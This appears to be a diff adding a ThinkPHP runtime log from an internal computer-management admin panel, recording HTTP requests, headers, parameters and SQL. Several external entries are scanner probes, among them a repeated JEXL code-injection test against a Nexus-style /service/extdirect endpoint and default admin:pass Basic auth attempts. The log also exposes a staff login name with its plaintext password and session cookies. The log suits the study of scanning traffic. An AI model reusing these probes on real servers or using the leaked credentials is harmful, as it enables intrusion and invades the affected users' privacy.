@@ -1,0 +1,1739 @@
+---------------------------------------------------------------
+[ 2020-12-01T00:53:15+08:00 ] 91.241.19.84 POST 113.116.135.3:8081/service/extdirect
+[运行时间：0.011973s] [吞吐率：83.52req/s] [内存消耗：471.60kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-length' => '293',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/service/extdirect' => '',
+  'action' => 'coreui_Component',
+  'data' => 
+  array (
+    0 => 
+    array (
+      'filter' => 
+      array (
+        0 => 
+        array (
+          'property' => 'repositoryName',
+          'value' => '*',
+        ),
+        1 => 
+        array (
+          'property' => 'expression',
+          'value' => '1==1',
+        ),
+        2 => 
+        array (
+          'property' => 'type',
+          'value' => 'jexl',
+        ),
+      ),
+      'limit' => '50',
+      'page' => '1',
+      'sort' => 
+      array (
+        0 => 
+        array (
+          'direction' => 'ASC',
+          'property' => 'name',
+        ),
+      ),
+      'start' => '0',
+    ),
+  ),
+  'method' => 'previewAssets',
+  'tid' => '18',
+  'type' => 'rpc',
+)
+---------------------------------------------------------------
+[ 2020-12-01T00:53:16+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/
+[运行时间：0.006924s] [吞吐率：144.42req/s] [内存消耗：490.88kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T00:53:18+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/jars
+[运行时间：0.007198s] [吞吐率：138.93req/s] [内存消耗：498.10kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/jars' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T00:53:19+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.010988s] [吞吐率：91.01req/s] [内存消耗：487.45kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/jars',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T00:53:20+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.007298s] [吞吐率：137.02req/s] [内存消耗：487.78kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T02:28:09+08:00 ] 47.242.8.85 GET 113.116.135.3:8081/
+[运行时间：0.003588s] [吞吐率：278.71req/s] [内存消耗：490.30kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'close',
+  'content-length' => '0',
+  'host' => '113.116.135.3:8081',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T05:14:36+08:00 ] 196.52.43.106 GET 113.116.135.3:8081/
+[运行时间：0.003780s] [吞吐率：264.54req/s] [内存消耗：489.14kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T05:14:36+08:00 ] 196.52.43.106 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.003883s] [吞吐率：257.52req/s] [内存消耗：485.65kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Go http package',
+  'referer' => 'http://113.116.135.3:8081/',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T08:15:30+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/index.html
+[运行时间：0.004094s] [吞吐率：244.27req/s] [内存消耗：498.88kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/index_html' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T08:15:30+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/adminlogin/index.html
+[运行时间：0.002849s] [吞吐率：351.02req/s] [内存消耗：487.75kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=1qf1mpcrk3o3n3vpc949i1corg',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T09:04:39+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/jars
+[运行时间：0.005815s] [吞吐率：171.97req/s] [内存消耗：497.20kb] [文件加载：76]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/jars' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T09:04:40+08:00 ] 91.241.19.84 POST 113.116.135.3:8081/service/extdirect
+[运行时间：0.006529s] [吞吐率：153.17req/s] [内存消耗：469.13kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-length' => '293',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/service/extdirect' => '',
+  'action' => 'coreui_Component',
+  'data' => 
+  array (
+    0 => 
+    array (
+      'filter' => 
+      array (
+        0 => 
+        array (
+          'property' => 'repositoryName',
+          'value' => '*',
+        ),
+        1 => 
+        array (
+          'property' => 'expression',
+          'value' => '1==1',
+        ),
+        2 => 
+        array (
+          'property' => 'type',
+          'value' => 'jexl',
+        ),
+      ),
+      'limit' => '50',
+      'page' => '1',
+      'sort' => 
+      array (
+        0 => 
+        array (
+          'direction' => 'ASC',
+          'property' => 'name',
+        ),
+      ),
+      'start' => '0',
+    ),
+  ),
+  'method' => 'previewAssets',
+  'tid' => '18',
+  'type' => 'rpc',
+)
+---------------------------------------------------------------
+[ 2020-12-01T09:04:41+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.003777s] [吞吐率：264.76req/s] [内存消耗：486.55kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/jars',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T09:04:42+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/
+[运行时间：0.003790s] [吞吐率：263.86req/s] [内存消耗：489.98kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T09:04:43+08:00 ] 91.241.19.84 GET 113.116.135.3:8081/padmin/adminlogin/index.html
+[运行时间：0.003406s] [吞吐率：293.60req/s] [内存消耗：486.88kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'authorization' => 'Basic YWRtaW46cGFzcw==',
+  'content-type' => 'application/json',
+  'referer' => 'http://113.116.135.3:8081/',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T10:12:20+08:00 ] 83.97.20.21 GET 113.116.135.3:8081/
+[运行时间：0.120313s] [吞吐率：8.31req/s] [内存消耗：488.72kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '113.116.135.3:8081',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T10:12:21+08:00 ] 83.97.20.21 GET /padmin/adminlogin/index.html
+[运行时间：0.026098s] [吞吐率：38.32req/s] [内存消耗：484.44kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T10:12:58+08:00 ] 69.162.83.246 GET example.comhttp://example.com/
+[运行时间：0.016639s] [吞吐率：60.10req/s] [内存消耗：488.73kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T10:12:59+08:00 ] 69.162.83.246 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.006374s] [吞吐率：156.88req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T10:18:48+08:00 ] 69.162.83.246 GET example.comhttp://example.com/
+[运行时间：0.014649s] [吞吐率：68.26req/s] [内存消耗：488.73kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'rule' => '',
+  'route' => 'index/index',
+  'option' => 
+  array (
+    'merge_rule_regex' => false,
+    'complete_match' => true,
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+---------------------------------------------------------------
+[ 2020-12-01T10:18:48+08:00 ] 69.162.83.246 GET example.comhttp://example.com/padmin/adminlogin/index.html
+[运行时间：0.004018s] [吞吐率：248.88req/s] [内存消耗：485.56kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'example.com',
+  'user-agent' => 'Go-http-client/1.1',
+  'referer' => 'http://example.com',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T11:32:19+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/adminlogin/index.html
+[运行时间：0.013415s] [吞吐率：74.54req/s] [内存消耗：487.84kb] [文件加载：74]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
+  0 => 'title',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T11:32:27+08:00 ] 192.168.10.58 POST 192.168.10.232/padmin/adminlogin/loginaction.html
+[运行时间：1.032248s] [吞吐率：0.97req/s] [内存消耗：693.06kb] [文件加载：79]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '31',
+  'origin' => 'http://192.168.10.232',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/adminlogin/loginaction_html' => '',
+  'username' => 'it02',
+  'password' => 'loevluma',
+)
+[ info ] [ DB ] INIT mysql
+[ sql ] [ DB ] CONNECT:[ UseTime:0.576164s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin` [ RunTime:0.293253s ]
+[ sql ] [ SQL ] SELECT * FROM `admin` WHERE  `username` = 'it02' LIMIT 1 [ RunTime:0.029673s ]
+[ sql ] [ SQL ] UPDATE `admin`  SET `lastip` = '192.168.10.58' , `lastvisit` = '1606793547'  WHERE  `id` = 17 [ RunTime:0.017355s ]
+---------------------------------------------------------------
+[ 2020-12-01T11:32:29+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/index.html
+[运行时间：0.055133s] [吞吐率：18.14req/s] [内存消耗：500.98kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/index_html' => '',
+)
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/index.html [ array (
+  0 => 'PAdmin',
+  1 => 'data',
+  2 => 'msg',
+) ]
+---------------------------------------------------------------
+[ 2020-12-01T11:32:30+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/font-awesome.css
+[运行时间：0.020796s] [吞吐率：48.09req/s] [内存消耗：469.20kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/font-awesome_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T11:32:30+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/animate.css
+[运行时间：0.015147s] [吞吐率：66.02req/s] [内存消耗：469.18kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/css,*/*;q=0.1',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/static/padmin/css/style.css',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+)
+[ info ] [ PARAM ] array (
+  '/static/padmin/css/animate_css' => '',
+)
+---------------------------------------------------------------
+[ 2020-12-01T11:32:30+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/index/computer.html
+[运行时间：0.117339s] [吞吐率：8.52req/s] [内存消耗：736.63kb] [文件加载：80]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '192.168.10.232',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-US,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'referer' => 'http://192.168.10.232/padmin/index/index.html',
+  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630; PHPSESSID=rakr0vrl0de8k45p9u6kmfsk0t',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  '/padmin/index/computer_html' => '',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/computer.html [ array (
+  0 => 'PAdmin',
+  1 => 'internetAccess',
+) ]
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001085s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `internet_access` [ RunTime:0.081108s ]
+[ sql ] [ SQL ] SELECT * FROM `internet_access` WHERE  `disabled` = 0 [ RunTime:0.000327s ]
+---------------------------------------------------------------
+[ 2020-12-01T11:32:30+08:00 ] 192.168.10.58 GET 192.168.10.232/static/padmin/css/font-awesome.css
+[运行时间：0.003158s] [吞吐率：316.65req/s] [内存消耗：469.20kb] [文件加载：75]
+[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
